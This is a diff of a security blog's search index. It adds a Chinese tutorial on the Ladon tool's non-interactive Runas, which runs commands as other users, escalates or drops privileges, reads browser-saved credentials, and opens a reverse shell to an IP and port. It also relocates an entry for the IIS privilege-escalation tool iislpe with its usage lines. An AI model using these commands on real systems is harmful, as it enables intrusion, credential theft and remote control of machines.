@@ -1220,6 +1220,35 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </tags>
   </entry>
   <entry>
+    <title>〖教程〗Ladon非交互式runas执行命令/反弹SHELL</title>
+    <url>/p/ladonnetsh.html</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。</p>
+<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>1.本机用户密码验证（权限不够读不到帐密或HASH的情况下，验证用户是否使用某个已知密码）<br>2.SYSTEM权限降权，SYS权限下以用户身份执行命令，实现会话穿透，或访问特定用户的DBAPI加密数据<br>3.低权限用户提权，网络服务帐户或用户权限下使用管理员权限来执行一些必须管理员才能执行的命令<br>4.浏览器密码读取，本机存在多个用户，需要读取对应用户保存帐密（DBAPI），如Chrome、Firefox<br>5.以指定用户权限反弹SHELL，当然也可以转发特定交互式命令行程序</p>
+<p>提示：Runas条件是有帐密，提权降权也可使用GetSystem，无需帐密只需指定对应用户权限进程即可</p>
+<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon Runas user pass cmd</span><br><span class="line">Ladon Runas user pass cmd domain</span><br><span class="line">Ladon RunasCS user pass cmd.exe ip port</span><br></pre></td></tr></table></figure>
+
+<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>当前机器默认开启UAC，登陆用户为null，管理员用户为k8gege，默认管理员用户为Administrator<br>Runas在不同权限下模拟其它用户权限有一定区别，如UAC下模拟非内置管理员用户则受到UAC限制。</p>
+<h3 id="测试目的"><a href="#测试目的" class="headerlink" title="测试目的"></a>测试目的</h3><p>以不同权限模拟登陆同一用户执行添加用户命令，对比Runas的执行权限<br>为什么用添加用户权限来对比，因为用户或管理员UAC是无法添加用户的<br>通过是否可添加用户，可轻易区分模拟后的权限到底是具备什么权限</p>
+<h3 id="Uac权限"><a href="#Uac权限" class="headerlink" title="Uac权限"></a>Uac权限</h3><p>非内置管理员用户在UAC权限下执行命令继承UAC权限，无法通过该用户权限添加用户<br>但是模拟内置管理员Administrator权限则不受UAC影响，可以通过该权限添加用户。</p>
+<p>Ladon Runas k8gege k8gege520 whoami<br>Ladon Runas Administrator k8gege520 whoami</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasUac.PNG"></p>
+<h3 id="Administrator权限"><a href="#Administrator权限" class="headerlink" title="Administrator权限"></a>Administrator权限</h3><p>管理员权限下模拟非内置管理员用户权限，是可以添加用户的<br>Ladon Runas k8gege k8gege520 whoami</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasAdmin.PNG"></p>
+<h3 id="System权限"><a href="#System权限" class="headerlink" title="System权限"></a>System权限</h3><p>SYSTEM权限下模拟非内置管理员用户权限，是可以添加用户的<br>Ladon Runas k8gege k8gege520 whoami</p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasAdmin.PNG"></p>
+<h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><p>版本Ladon&gt;=7.8<br>LadonGUI–Netcat监听,执行以下命令即可以指定用户权限反弹shell<br>Ladon RunasCS user pass cmd.exe ip port<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasNC.PNG"></p>
+<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>在UAC下需要模拟管理员权限执行命令，先过UAC或使用内置管理员<br>管理员或SYSTEM权限模拟的用户具备什么权限，它就有对应的权限</p>
+<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Ladon</tag>
+        <tag>netsh</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>〖教程〗Ladon 7.8 netsh端口转发/端口映射</title>
     <url>/p/ladonnetsh.html</url>
     <content><![CDATA[<h3 id="Ladon7-8"><a href="#Ladon7-8" class="headerlink" title="Ladon7.8"></a>Ladon7.8</h3><p>由于系统netsh命令较长，Ladon新增netsh命令，方便CS或SHELL下使用，查看无需管理员功能，增加和删除都需要管理员</p>
@@ -2096,11 +2125,11 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>主机发现</category>
         <category>源码</category>
+        <category>主机发现</category>
         <category>内网渗透</category>
-        <category>信息收集</category>
         <category>编程</category>
+        <category>信息收集</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -2296,8 +2325,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>Ladon</category>
         <category>Cobalt Strike</category>
-        <category>远程执行</category>
         <category>内网渗透</category>
+        <category>远程执行</category>
       </categories>
       <tags>
         <tag>Cobalt Strike</tag>
@@ -4318,8 +4347,8 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
       </categories>
       <tags>
         <tag>Exp</tag>
-        <tag>Tool</tag>
         <tag>Code</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
       </tags>
   </entry>
@@ -4577,33 +4606,6 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
       </tags>
   </entry>
   <entry>
-    <title>全版本IIS提权工具iislpe</title>
-    <url>/p/6b9b3afe.html</url>
-    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
-<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
-<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
-<p><strong>原理:</strong></p>
-<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
-<p><strong>用法:</strong></p>
-<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
-<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
-<p>&nbsp;</p>
-<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
-<p>&nbsp; &nbsp;&nbsp; </p>
-<p>&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>LPE</tag>
-        <tag>IIS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>基于Browser协议探测内网主机</title>
     <url>/p/16b5ff0b.html</url>
     <content><![CDATA[<p>利用Browser协议可获取机器IP、MAC、机器名、操作系统、域，如图</p>
@@ -4666,18 +4668,45 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>主机发现</category>
         <category>源码</category>
-        <category>嗅探</category>
+        <category>主机发现</category>
         <category>内网渗透</category>
-        <category>信息收集</category>
+        <category>嗅探</category>
         <category>编程</category>
+        <category>信息收集</category>
         <category>Python</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Code</tag>
+        <tag>Tool</tag>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>全版本IIS提权工具iislpe</title>
+    <url>/p/6b9b3afe.html</url>
+    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
+<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
+<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
+<p><strong>原理:</strong></p>
+<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
+<p><strong>用法:</strong></p>
+<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
+<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
+<p>&nbsp;</p>
+<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
+<p>&nbsp; &nbsp;&nbsp; </p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>LPE</tag>
+        <tag>IIS</tag>
       </tags>
   </entry>
 </search>
